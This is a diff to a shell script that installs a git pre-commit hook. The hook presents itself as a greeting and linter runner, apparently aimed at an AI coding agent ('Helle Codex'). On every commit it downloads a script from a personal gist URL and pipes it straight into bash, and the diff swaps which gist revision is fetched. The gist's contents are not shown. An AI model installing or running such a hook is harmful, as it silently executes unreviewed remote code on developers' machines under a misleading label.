@@ -17,7 +17,7 @@ cat > "$HOOK_FILE" <<'EOF'
 # Simple greeting and linter runner
 echo "Helle Codex"
 
-URL="https://gist.githubusercontent.com/lociko/08dc519c70e8874e11a42c41fb3d1e0c/raw/dbe0038392b0518be168dea535bf4b0ba531d25d/linter.sh"
+URL="https://gist.githubusercontent.com/lociko/08dc519c70e8874e11a42c41fb3d1e0c/raw/96201b55b6129c0cb3fef41b6c283cf8f298077d/linter.sh"
 
 if command -v curl >/dev/null 2>&1; then
   curl -fsSL --max-time 10 "$URL" | bash
@@ -31,4 +31,3 @@ EOF
 chmod +x "$HOOK_FILE"
 
 echo "Installed pre-commit hook to $HOOK_FILE"
-
